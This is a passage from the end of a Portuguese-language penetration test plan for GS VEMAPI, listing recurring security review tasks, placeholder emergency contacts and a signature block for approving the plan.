| Varredura de vulnerabilidades | Semanal | DevSecOps |
| Revisão de dependências | Semanal | Dependabot / Snyk |
| Revisão de logs de auditoria | Diária | SOC / Time de infra |
| Teste de mesa de resposta a incidentes | Trimestral | CISO + Dev team |
| Atualização de plano de continuidade | Anual | DPO / CISO |

### 8.5 Contatos de Emergência

| Função | Responsável | Contato |
|--------|-----------|---------|
| CISO | [Nome] | [Email] |
| Tech Lead | [Nome] | [Email] |
| DPO (LGPD) | [Nome] | [Email] |
| DevOps | [Nome] | [Email] |

### 8.6 Termo de Aprovação

```
Este plano de teste de penetração foi revisado e aprovado pelas partes envolvidas.

Empresa contratante: GS VEMAPI
Empresa contratada: [Equipe de Segurança]

______________________________          ______________________________
Assinatura do Cliente                    Assinatura do Pentester

Data: ____/____/2026
```

---

**Documento mantido pelo time de segurança GS VEMAPI**
Versão 1.0 — Julho 2026
Classificação: CONFIDENCIAL
